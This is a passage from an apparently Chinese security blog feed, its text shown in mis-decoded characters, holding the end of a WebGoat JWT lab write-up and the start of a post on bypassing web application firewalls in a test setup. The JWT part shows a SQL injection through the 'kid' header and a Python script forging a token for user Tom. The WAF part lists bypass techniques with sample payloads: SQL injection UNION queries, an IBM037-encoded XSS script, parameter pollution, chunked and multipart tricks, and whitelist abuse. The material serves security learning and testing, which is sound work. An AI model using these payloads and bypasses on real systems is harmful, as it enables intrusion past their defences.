class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€»è¾‘ï¼šè·å–å¯†é’¥ï¼Œç„¶åè§£ætokenï¼Œè·å¾—claimsä¸­çš„usernameï¼Œå¦‚æœä¸ºTomåˆ™åˆ é™¤æˆåŠŸã€‚</p><p><strong>å…³é”®</strong>ï¼šè·å–å¯†é’¥çš„éƒ¨åˆ†</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">SigningKeyResolverAdapter</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] resolveSigningKeyBytes(JwsHeader header, Claims claims) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">kid</span> <span class="operator">=</span> (String) header.get(<span class="string">&quot;kid&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">var</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection()) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// é€šè¿‡æŸ¥è¯¢kidæ¥è·å¾—keyï¼Œå¾ˆæ˜æ˜¾å­˜åœ¨sqlæ³¨å…¥</span></span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span>connection.createStatement().executeQuery(<span class="string">&quot;SELECT key FROM jwt_keys WHERE id = &#x27;&quot;</span> + kid + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">      </span><br><span class="line">            <span class="keyword">while</span> (rs.next()) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// è¿”å›base64è§£ç åçš„key</span></span><br><span class="line">            <span class="keyword">return</span> TextCodec.BASE64.decode(rs.getString(<span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">catch</span> (SQLException e) </span><br><span class="line">        &#123;</span><br><span class="line">            errorMessage[<span class="number">0</span>] = e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£å¸¸çš„æ€è·¯æ˜¯é€šè¿‡å¯¹kidå‚æ•°è¿›è¡Œsqlæ³¨å…¥ï¼Œä¼ªé€ key</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> key <span class="keyword">FROM</span> jwt_keys <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;&quot; + kid + &quot;&#x27;</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºTomçš„jwtä¸­kidä¸º<code>webgoat_key</code>ï¼Œè¯´æ˜åœ¨jwt_keysè¡¨ä¸­æœ‰ä¸€ä¸ªidçš„å€¼ä¸º<code>webgoat_key</code>ã€‚</p><p>æ‰€ä»¥å¯ä»¥å¯¹kidæ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kid: y<span class="string">&#x27; and 1=2 union select id from jwt_keys where id =&#x27;</span>webgoat_key</span><br></pre></td></tr></table></figure><p>è¿™æ ·sqlæŸ¥è¯¢çš„ç»“æœå°±ä¸º<code>webgoat_key</code>ï¼Œå³keyä¸º<code>webgoat_key</code>ï¼Œä½†æ˜¯å› ä¸º</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TextCodec.BASE64.decode(rs.getString(<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>æ— æ³•å¯¹<code>webgoat_key</code>è¿›è¡Œbase64è§£ç ï¼Œå°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p><p>ç”¨<code>webgoat_key</code>ä½œä¸ºkey</p><p><img src="/../images/image-20230608204646391.png" alt="image-20230608204646391"></p><p>é€šè¿‡æºç å¾—åˆ°çœŸæ­£çš„keyä¸º</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = base64.b64decode(<span class="string">&quot;qwertyqwerty1234&quot;</span>)</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line">token_dict = &#123;</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1529569536</span>,</span><br><span class="line">    <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;WebGoat Token Builder&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">2018905304</span>,</span><br><span class="line">    <span class="string">&quot;aud&quot;</span>: <span class="string">&quot;webgoat.org&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;jerry@webgoat.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;Tom&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Email&quot;</span>: <span class="string">&quot;jerry@webgoat.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Role&quot;</span>: [<span class="string">&quot;Cat&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">key = base64.b64decode(<span class="string">&quot;qwertyqwerty1234&quot;</span>)</span><br><span class="line"><span class="comment"># headers</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">    <span class="comment"># &quot;kid&quot;: &quot;123&#x27; and 1=2 union select id FROM jwt_keys WHERE id=&#x27;webgoat_key&quot;,</span></span><br><span class="line">    <span class="string">&quot;kid&quot;</span>: <span class="string">&quot;webgoat_key&quot;</span>,</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># è°ƒç”¨jwtåº“,ç”Ÿæˆjson web token</span></span><br><span class="line">jwt_token = jwt.encode(payload=token_dict,  <span class="comment"># payload, æœ‰æ•ˆè½½ä½“</span></span><br><span class="line">                       key=key,  <span class="comment"># è¿›è¡ŒåŠ å¯†ç­¾åçš„å¯†é’¥</span></span><br><span class="line">                       algorithm=<span class="string">&quot;HS256&quot;</span>,  <span class="comment"># æŒ‡æ˜ç­¾åç®—æ³•æ–¹å¼, é»˜è®¤ä¹Ÿæ˜¯HS256</span></span><br><span class="line">                       headers=headers  <span class="comment"># json web token æ•°æ®ç»“æ„åŒ…å«ä¸¤éƒ¨åˆ†, payload(æœ‰æ•ˆè½½ä½“), headers(æ ‡å¤´)</span></span><br><span class="line">                       ).decode(<span class="string">&#x27;ascii&#x27;</span>)  <span class="comment"># python3 ç¼–ç åå¾—åˆ° bytes, å†è¿›è¡Œè§£ç (æŒ‡æ˜è§£ç çš„æ ¼å¼), å¾—åˆ°ä¸€ä¸ªstr</span></span><br><span class="line"><span class="built_in">print</span>(jwt_token)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230608204947847.png" alt="image-20230608204947847"></p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://jwt.io/introduction">https://jwt.io/introduction</a></p><p><a href="http://www.xianxianlabs.com/blog/2018/06/03/96.html">http://www.xianxianlabs.com/blog/2018/06/03/96.html</a></p><p><a href="https://www.freebuf.com/vuls/216457.html">https://www.freebuf.com/vuls/216457.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>wafç»•è¿‡ç®€å•å­¦ä¹ </title>
      <link href="/2023/06/01/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/06/01/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="çŸ¥å·±çŸ¥å½¼"><a href="#çŸ¥å·±çŸ¥å½¼" class="headerlink" title="çŸ¥å·±çŸ¥å½¼"></a>çŸ¥å·±çŸ¥å½¼</h2><p><a href="https://www.cnblogs.com/realjimmy/p/12937247.html">WAFåŠŸèƒ½ä»‹ç»ï¼ˆå…¥é—¨æ‰«ç›²ç¯‡ï¼‰ - ä¸€è§‰é†’æ¥å†™ç¨‹åº - åšå®¢å›­</a></p><ul><li>è§„åˆ™å¼•æ“åˆ†ä¸ºä¸¤å—ï¼Œå¯¹è¯·æ±‚è¿‡æ»¤å’Œå¯¹å“åº”è¿‡æ»¤ï¼Œè€Œå¯¹è¯·æ±‚è¿‡æ»¤åˆ†ä¸ºä¸¤å¤§æ­¥ï¼Œç½‘ç»œå±‚è¿‡æ»¤å’Œåº”ç”¨å±‚è¿‡æ»¤ã€‚</li><li>WAFæ¯æ¡è§„åˆ™éƒ½ä¼šé…ç½®åŠ¨ä½œï¼Œå¯¹å‘½ä¸­è§„åˆ™çš„è¯·æ±‚è¿›è¡Œå¯¹åº”çš„å¤„ç†ã€‚</li></ul><h3 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h3><p><img src="/../images/image-20230516142728508.png" alt="image-20230516142728508"></p><p>æœ¬æ–‡ä»¥å®‰å…¨ç‹—ä¸ºä¾‹å­è¿›è¡Œç®€å•å­¦ä¹ </p><h3 id="éƒ¨ç½²ä½ç½®"><a href="#éƒ¨ç½²ä½ç½®" class="headerlink" title="éƒ¨ç½²ä½ç½®"></a>éƒ¨ç½²ä½ç½®</h3><p><img src="/../images/2015081104292360563.png" alt="enter image description here"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯·æ±‚ â†’ CDN â†’ äº‘waf â†’ ç¡¬waf â†’ WEBæœåŠ¡å™¨ â†’ è½¯waf â†’ WEBåº”ç”¨ç¨‹åºï¼ˆä»£ç wafï¼‰ â†’ (æ•°æ®åº“)</span><br></pre></td></tr></table></figure><h2 id="å‚¨å¤‡çŸ¥è¯†"><a href="#å‚¨å¤‡çŸ¥è¯†" class="headerlink" title="å‚¨å¤‡çŸ¥è¯†"></a>å‚¨å¤‡çŸ¥è¯†</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wafäº†è§£</span><br><span class="line">å„ç§è¯­æ³•</span><br><span class="line">httpåè®®</span><br><span class="line">webæœåŠ¡å™¨ç‰¹æ€§</span><br></pre></td></tr></table></figure><h2 id="WAFç»•è¿‡"><a href="#WAFç»•è¿‡" class="headerlink" title="WAFç»•è¿‡"></a>WAFç»•è¿‡</h2><h3 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h3><p>æ²¡æœ‰åœ¨ä»£ç ä¸­è¿›è¡Œè¿‡æ»¤ï¼Œå¦‚æœ‰ä¼šè¯´æ˜ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win  10</span><br><span class="line">php  5.6.9</span><br><span class="line">mysql 5.7.26</span><br><span class="line">apache 2.4.39</span><br><span class="line">safe dog V3.5 </span><br></pre></td></tr></table></figure><p>é…ç½®å¦‚ä¸‹</p><p><img src="/../images/image-20230516235356524.png" alt="image-20230516235356524"></p><p><img src="/../images/image-20230516150636839.png" alt="image-20230516150636839"></p><p>ç‰¹å¾</p><p><img src="/../images/image-20230517003655268.png" alt="image-20230517003655268"></p><p><img src="/../images/image-20230517100649383.png" alt="image-20230517100649383"></p><h3 id="è¿‚å›ä½œæˆ˜"><a href="#è¿‚å›ä½œæˆ˜" class="headerlink" title="è¿‚å›ä½œæˆ˜"></a>è¿‚å›ä½œæˆ˜</h3><blockquote><p>ä¸»æ‰“ä¸€ä¸ªä¾§é¢ç»•è¿‡ï¼Œåˆ©ç”¨å„ç§ç¼ºé™·å’Œç‰¹æ€§ä½¿å¾—<strong>wafæ²¡æœ‰è§£æåˆ°payload</strong>ï¼Œä¸ä¸wafçš„è§„åˆ™å’Œç­–ç•¥ç¡¬åˆš</p></blockquote><h4 id="WebæœåŠ¡å™¨ç‰¹æ€§"><a href="#WebæœåŠ¡å™¨ç‰¹æ€§" class="headerlink" title="WebæœåŠ¡å™¨ç‰¹æ€§"></a>WebæœåŠ¡å™¨ç‰¹æ€§</h4><blockquote><p>WebæœåŠ¡å™¨è§£æä¸wafè§£æä¸åŒç»•è¿‡</p></blockquote><h5 id="IIS-ASP"><a href="#IIS-ASP" class="headerlink" title="IIS+ASP"></a>IIS+ASP</h5><ul><li><p><code>%</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯¹äºURLè¯·æ±‚çš„å‚æ•°å€¼ä¸­çš„%ï¼Œå¦‚æœå’Œåé¢çš„å­—ç¬¦æ„æˆçš„å­—ç¬¦ä¸²åœ¨URLç¼–ç è¡¨ä¹‹å¤–ï¼ŒASPè„šæœ¬å¤„ç†æ—¶ä¼šå°†å…¶å¿½ç•¥ã€‚</span><br><span class="line"></span><br><span class="line">select  â†’  se%lect</span><br></pre></td></tr></table></figure></li><li><p><code>unicode</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IISä¼šè‡ªåŠ¨è§£ç unicode</span><br></pre></td></tr></table></figure></li></ul><h5 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/path1/path2/ == ;/path1;foo/path2;bar/;</span><br></pre></td></tr></table></figure><h5 id="å‚æ•°æ±¡æŸ“"><a href="#å‚æ•°æ±¡æŸ“" class="headerlink" title="å‚æ•°æ±¡æŸ“"></a>å‚æ•°æ±¡æŸ“</h5><p>ä¼ é€’å¤šä¸ªç›¸åŒå‚æ•°ï¼Œåˆ©ç”¨wafå’ŒwebæœåŠ¡å™¨è§£æçš„å‚æ•°ä¸åŒæ¥è¿›è¡Œç»•è¿‡</p><table><thead><tr><th align="left">Web ç¯å¢ƒ</th><th align="left">å‚æ•°è·å–å‡½æ•°</th><th align="left">è·å–åˆ°çš„å‚æ•°</th></tr></thead><tbody><tr><td align="left">PHP&#x2F;Apache</td><td align="left">$_GET(â€œparâ€)</td><td align="left">last</td></tr><tr><td align="left">JSP&#x2F;Tomcat</td><td align="left">Request.getParameter(â€œparâ€)</td><td align="left">first</td></tr><tr><td align="left">Perl(CGI)&#x2F;Apache</td><td align="left">Param(â€œparâ€)</td><td align="left">first</td></tr><tr><td align="left">Python&#x2F;Apache</td><td align="left">getvalue(â€œparâ€)</td><td align="left">[â€œfirstâ€,â€lastâ€]</td></tr><tr><td align="left">ASP.NET&#x2F;IIS</td><td align="left">Request.QueryString(â€œparâ€)</td><td align="left">first,last</td></tr></tbody></table><h4 id="Webåº”ç”¨ç¨‹åºå±‚"><a href="#Webåº”ç”¨ç¨‹åºå±‚" class="headerlink" title="Webåº”ç”¨ç¨‹åºå±‚"></a>Webåº”ç”¨ç¨‹åºå±‚</h4><blockquote><p>Webåº”ç”¨ç¨‹åºå±‚ï¼ˆåç«¯ä»£ç ï¼‰è§£æä¸wafè§£æä¸åŒ</p><p><strong>wafæ²¡æœ‰æ ¹æ®åç«¯ä»£ç æ¥ä¿®æ”¹ç­–ç•¥å’Œè§„åˆ™</strong></p></blockquote><h5 id="ç¼–ç "><a href="#ç¼–ç " class="headerlink" title="ç¼–ç "></a>ç¼–ç </h5><p>å¯¹è¯·æ±‚æ•°æ®è¿›è¡Œç¼–ç ï¼Œä¾‹å¦‚urlç¼–ç ï¼ŒUnicodeç¼–ç ç­‰ï¼Œå¦‚æœwafå¯¹æ•°æ®ä¸èƒ½æœ‰æ•ˆçš„è§£ç ï¼Œè€Œåº”ç”¨åç«¯èƒ½å¤Ÿæ­£å¸¸è§£ç ï¼Œå°±å¯ä»¥ç»•è¿‡wafã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jsonæ•°æ®æ”¯æŒunicodeç¼–ç </span><br></pre></td></tr></table></figure><h5 id="å¤šæ•°æ®æ¥æº"><a href="#å¤šæ•°æ®æ¥æº" class="headerlink" title="å¤šæ•°æ®æ¥æº"></a>å¤šæ•°æ®æ¥æº</h5><p>webåº”ç”¨ç¨‹åºä»å¤šä¸ªåœ°æ–¹å–å€¼ï¼Œå¦‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php</span></span><br><span class="line"><span class="variable">$param</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;xxxx&#x27;</span>]</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä»<code>GET,POST,HEADER,METHOD</code>ç­‰åœ°æ–¹è·å–ç”¨æˆ·æäº¤çš„å‚æ•°ã€‚</p><p>å¦‚æœwafåªå¯¹<code>GETï¼ŒPOST</code>è¿›è¡Œæ£€æµ‹,æ²¡æœ‰ä¸åç«¯ç›¸é€‚åº”ï¼Œå°±å¯ä»¥ç»•è¿‡ã€‚</p><h4 id="HTTPåè®®"><a href="#HTTPåè®®" class="headerlink" title="HTTPåè®®"></a>HTTPåè®®</h4><h5 id="åˆ†å—ä¼ è¾“"><a href="#åˆ†å—ä¼ è¾“" class="headerlink" title="åˆ†å—ä¼ è¾“"></a>åˆ†å—ä¼ è¾“</h5><p>Burpæ’ä»¶ï¼š<a href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Transfer-Encoding: chunked  <span class="comment"># è¡¨ç¤ºBODYçš„ä¼ è¾“ç¼–ç æ–¹å¼ä¸ºchunkedï¼ˆæ— Content-Lengthå­—æ®µï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span> <span class="comment"># æŒ‡æ˜ä¼ è¾“çš„æ•°æ®é•¿åº¦</span></span><br><span class="line">a=<span class="number">1</span></span><br><span class="line"><span class="number">0</span> <span class="comment"># è¡¨ç¤ºä¼ è¾“ç»“æŸ</span></span><br></pre></td></tr></table></figure><p>å®éªŒ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>] å¤±è´¥</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>] æˆåŠŸ</span><br></pre></td></tr></table></figure><h5 id="keep-alive"><a href="#keep-alive" class="headerlink" title="keep-alive"></a>keep-alive</h5><p>httpé•¿è¿æ¥ï¼Œå‘é€å¤šä¸ªæ•°æ®åŒ…è¯·æ±‚ï¼Œæ„Ÿè§‰è·Ÿè¯·æ±‚èµ°ç§å¾ˆåƒ</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br></pre></td></tr></table></figure><p>éœ€è¦å…³é—­</p><p><img src="/../images/image-20230517113339255.png" alt="image-20230517113339255"></p><h5 id="multipart-x2F-form-data"><a href="#multipart-x2F-form-data" class="headerlink" title="multipart&#x2F;form-data"></a>multipart&#x2F;form-data</h5><p><strong>æ¨èé˜…è¯»</strong></p><p><a href="http://www.moonslow.com/article/tencent_waf_bypass">http://www.moonslow.com/article/tencent_waf_bypass</a></p><blockquote><p><strong>æƒ³åŠæ³•è®©WAFä»¥ä¸ºæˆ‘ä»¬æ˜¯åœ¨ä¸Šä¼ æ–‡ä»¶ï¼Œè€Œå®é™…ä¸Šå´æ˜¯åœ¨POSTä¸€ä¸ªå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°å¯ä»¥æ˜¯å‘½ä»¤æ³¨å…¥ã€SQLæ³¨å…¥ã€SSRFç­‰ä»»æ„çš„ä¸€ç§æ”»å‡»ï¼Œè¿™æ ·å°±å®ç°äº†é€šç”¨WAF Bypass</strong></p><p>ä½•æ—¶æ˜¯ä¸Šä¼ æ–‡ä»¶ï¼Ÿä½•æ—¶æ˜¯POSTå‚æ•°å‘¢ï¼Ÿè¿™ä¸ªå…³é”®ç‚¹åœ¨äºæœ‰æ²¡æœ‰ä¸€ä¸ªå®Œæ•´çš„ï¼Œè¿ç»­çš„**filename&#x3D;**ï¼Œä¸­é—´å¯ä»¥æ’å…¥<code>\r\n</code>æˆ–è€…<code>\n</code></p></blockquote><p><img src="/../images/image-20230518163001348.png" alt="image-20230518163001348"></p><h5 id="ç•¸å½¢è¯·æ±‚æ–¹æ³•"><a href="#ç•¸å½¢è¯·æ±‚æ–¹æ³•" class="headerlink" title="ç•¸å½¢è¯·æ±‚æ–¹æ³•"></a>ç•¸å½¢è¯·æ±‚æ–¹æ³•</h5><p>æŠ“åŒ…ï¼Œç„¶åä¿®æ”¹è¯·æ±‚æ–¹æ³•</p><h5 id="chrestç¼–ç "><a href="#chrestç¼–ç " class="headerlink" title="chrestç¼–ç "></a>chrestç¼–ç </h5><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">content-type</span><span class="punctuation">: </span>charest=cp037</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ibm869</span><br><span class="line">ibm870</span><br><span class="line">ibm871</span><br><span class="line">ibm918</span><br><span class="line">iso-2022-cn</span><br><span class="line">iso-2022-jp</span><br><span class="line">iso-2022-jp-2</span><br><span class="line">iso-2022-kr</span><br><span class="line">iso-8859-1</span><br><span class="line">iso-8859-13</span><br><span class="line">iso-8859-15</span><br></pre></td></tr></table></figure><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse </span><br><span class="line">payload = <span class="string">&#x27;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&#x27;</span> </span><br><span class="line"><span class="built_in">print</span>(urllib.parse.quote_plus(payload.encode(<span class="string">&quot;IBM037&quot;</span> )))</span><br></pre></td></tr></table></figure><h4 id="wafç‰¹æ€§"><a href="#wafç‰¹æ€§" class="headerlink" title="wafç‰¹æ€§"></a>wafç‰¹æ€§</h4><blockquote><p>éƒ¨ç½²æ–¹å¼ï¼Œç­–ç•¥ä¸è§„åˆ™ç¼ºé™·</p></blockquote><h5 id="äº‘waf"><a href="#äº‘waf" class="headerlink" title="äº‘waf"></a>äº‘waf</h5><p><img src="/../images/zh-cn_image_0000001193876233.png" alt="img"></p><p>â€‹é€šè¿‡æ”¹å˜ç”¨æˆ·åŸŸåçš„DNSè§£æåœ°å€æ¥å°†Webæµé‡ç‰µå¼•åˆ°äº‘WAFå¼•æ“é›†ç¾¤ï¼Œç»è¿‡æ£€æµ‹åå†å›æºè‡³çœŸæ­£çš„WebæœåŠ¡å™¨ã€‚</p><p><img src="/../images/zh-cn_image_0000001159784637.png" alt="img"></p><p>â€‹æ‰€ä»¥å¦‚æœå¯ä»¥æ‰¾åˆ°ç›®æ ‡çš„çœŸå®ipï¼Œå°±å¯ä»¥ç»•è¿‡äº‘wafã€‚</p><h5 id="æ€§èƒ½ç¼ºé™·"><a href="#æ€§èƒ½ç¼ºé™·" class="headerlink" title="æ€§èƒ½ç¼ºé™·"></a>æ€§èƒ½ç¼ºé™·</h5><h6 id="é«˜å¹¶å‘"><a href="#é«˜å¹¶å‘" class="headerlink" title="é«˜å¹¶å‘"></a>é«˜å¹¶å‘</h6><p>ç”¨Burpçš„<code>Trubo Intruder</code>æ’ä»¶,å¤±è´¥</p><p>è€Œä¸”é«˜å¹¶å‘å¾ˆå¯èƒ½ä¼šé€ æˆä¸šåŠ¡ç³»ç»Ÿå‡ºç°é—®é¢˜ã€‚</p><h6 id="è„æ•°æ®"><a href="#è„æ•°æ®" class="headerlink" title="è„æ•°æ®"></a>è„æ•°æ®</h6><p>ä¸ºäº†é˜²æ­¢æ¶ˆè€—å¤ªå¤šçš„CPUã€å†…å­˜èµ„æºï¼Œå› æ­¤è®¸å¤šWAFåªæ£€æµ‹å‰é¢çš„2Mæˆ–4Mçš„å†…å®¹ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡å¡«å……åƒåœ¾æ•°æ®è¿›è¡Œç»•è¿‡ã€‚</p><h6 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h6><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516150951130.png" alt="image-20230516150951130"></p><p>å®‰å…¨ğŸ•åœ¨<code>HTTP BODY</code>ä¸­æ£€æµ‹åˆ°äº†å…³é”®å­—ï¼Œç›´æ¥è¿”å›500ã€‚ã€‚</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">a<span class="operator">=</span><span class="number">8172</span><span class="operator">*</span>A<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516151625299.png" alt="image-20230516151625299"></p><h6 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h6><p><code>waf</code>å¯èƒ½ç›´æ¥æ£€æµ‹é•¿åº¦æ¥æ‹¦æˆª</p><p>å¦‚å®‰å…¨ğŸ•,<code>GET</code>ä¸‹æ˜¯ä¸è¡Œçš„</p><p><img src="/../images/image-20230516151807403.png" alt="image-20230516151807403"></p><h5 id="ç™½åå•æœºåˆ¶"><a href="#ç™½åå•æœºåˆ¶" class="headerlink" title="ç™½åå•æœºåˆ¶"></a>ç™½åå•æœºåˆ¶</h5><ul><li><p>æ–‡ä»¶ç™½åå•</p><blockquote><p>ä¸€äº› WAF ä¸ºäº†ä¿è¯æ ¸å¿ƒåŠŸèƒ½å¦‚ç™»é™†åŠŸèƒ½æ­£å¸¸ï¼Œä¼šåœ¨å†…éƒ¨è®¾ç«‹ä¸€ä¸ªæ–‡ä»¶ç™½åå•ï¼Œæˆ–å†…å®¹ç™½åå•ï¼Œåªè¦å’Œè¿™äº›æ–‡ä»¶æˆ–å†…å®¹æœ‰å…³ï¼Œæ— è®ºæ€ä¹ˆæµ‹è¯•ï¼Œéƒ½ä¸ä¼šè¿›è¡Œæ‹¦æˆªã€‚</p><p>å¦‚ï¼šWAF è®¾ç«‹äº†ç™½åå•<code>/admin</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„æµ‹è¯• payload å¯ä»¥é€šè¿‡å¦‚ä¸‹çš„æ‰‹æ³•æ¥ç»•è¿‡</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åŸæ¥è¢«æ‹¦æˆª</span></span><br><span class="line">http:<span class="comment">//a.a/?id=123 and 2*3=6</span></span><br><span class="line"><span class="comment"># ç°åœ¨ä¸æ‹¦æˆª</span></span><br><span class="line">http:<span class="comment">//a.a/?a=/admin&amp;id=123 and 2*3=6</span></span><br></pre></td></tr></table></figure></li><li><p>IPç™½åå•</p><blockquote><p>åç«¯é€šè¿‡Headerå­—æ®µè·å–æºIP</p></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">X-FORWARDED-FORç­‰</span><br></pre></td></tr></table></figure></li><li><p>UAç™½åå•</p><blockquote><p>æŸäº›WAFå¯èƒ½ä¸ºäº†ä¸å½±å“ç«™ç‚¹çš„SEOä¼˜åŒ–ï¼Œå°†User-Agentä¸ºæŸäº›æœç´¢å¼•æ“ï¼ˆå¦‚è°·æ­Œï¼‰çš„è¯·æ±‚å½“ä½œç™½åå•å¤„ç†ï¼Œä¸æ£€æµ‹å’Œæ‹¦æˆªã€‚</p></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">User-Agent</span><br></pre></td></tr></table></figure><p>UAæ”¶é›†ï¼š<a href="https://www.0735.pro/archives/study/51.html">https://www.0735.pro/archives/study/51.html</a></p></li></ul><h5 id="é™æ€æ–‡ä»¶ç»•è¿‡"><a href="#é™æ€æ–‡ä»¶ç»•è¿‡" class="headerlink" title="é™æ€æ–‡ä»¶ç»•è¿‡"></a>é™æ€æ–‡ä»¶ç»•è¿‡</h5><p>ä¸€äº› WAF ä¸ºäº†å‡å°‘æœåŠ¡å™¨çš„å‹åŠ›ï¼Œä¼šå¯¹é™æ€æ–‡ä»¶å¦‚<code>.png</code>ã€<code>.css</code>ç­‰ç›´æ¥æ”¾è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•ä¼ªè£…æˆé™æ€æ–‡ä»¶æ¥ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åŸæ¥è¢«æ‹¦æˆª</span></span><br><span class="line">http:<span class="comment">//a.a/?id=123 and 2*3=6</span></span><br><span class="line"><span class="comment"># ç°åœ¨ä¸æ‹¦æˆª</span></span><br><span class="line">http:<span class="comment">//a.a/?1.jpg&amp;id=123 and 2*3=6</span></span><br></pre></td></tr></table></figure><h5 id="è¯·æ±‚æ–¹å¼"><a href="#è¯·æ±‚æ–¹å¼" class="headerlink" title="è¯·æ±‚æ–¹å¼"></a>è¯·æ±‚æ–¹å¼</h5><ol><li>ä¸€äº› WAF å¯¹äº<code>get</code>è¯·æ±‚å’Œ<code>post</code>è¯·æ±‚çš„å¤„ç†æœºåˆ¶ä¸ä¸€æ ·ï¼Œå¯èƒ½å¯¹ POST è¯·æ±‚ç¨åŠ æ¾æ‡ˆï¼Œå› 